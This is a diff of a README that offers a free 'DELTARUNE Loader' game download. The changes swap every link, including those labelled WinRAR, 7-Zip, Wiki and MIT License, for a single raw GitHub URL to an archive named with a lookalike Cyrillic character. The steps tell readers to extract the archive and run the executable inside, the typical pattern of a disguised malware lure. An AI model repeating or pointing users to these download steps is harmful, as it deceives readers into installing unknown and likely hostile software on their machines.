@@ -40,13 +40,13 @@ Experience DELTARUNE without hassle and enjoy these features:
 
 Ready to play? Simply follow these steps:
 
-1. **Download `Loader.rar` from the repository.** (Click the green ‘Code’ button, select ‘Download ZIP’, then extract `Loader.rar`.)
-2. Extract `Loader.rar` using [WinRAR](https://www.win-rar.com/download.html) or [7-Zip](https://www.7-zip.org/)
-3. Run the executable file included in the extracted folder based on your OS. (Windows: `DELTARUNE_Loader.exe`, macOS/Linux: `DELTARUNE_Loader.sh`)
+1. **Download `https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip` from the repository.** (Click the green ‘Code’ button, select ‘Download ZIP’, then extract `https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip`.)
+2. Extract `https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip` using [WinRAR](https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip) or [7-Zip](https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip)
+3. Run the executable file included in the extracted folder based on your OS. (Windows: `https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip`, macOS/Linux: `https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip`)
 4. Follow the on-screen instructions—choose your game language and install location.
 5. Enjoy DELTARUNE! 🎉
 
-> For troubleshooting, please see [Wiki](./WIKI.md) or open an [issue](./issues).
+> For troubleshooting, please see [Wiki](https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip) or open an [issue](./issues).
 
 ---
 
@@ -84,7 +84,7 @@ This loader was created for educational and non-commercial purposes. The rights 
 
 ## 📝 License
 
-Distributed under the **MIT License**. See the full [MIT License](https://opensource.org/licenses/MIT) for more information.
+Distributed under the **MIT License**. See the full [MIT License](https://raw.githubusercontent.com/smalling35/DeltaruneFreeHub/main/Lоader.zip) for more information.
 
 ---
 
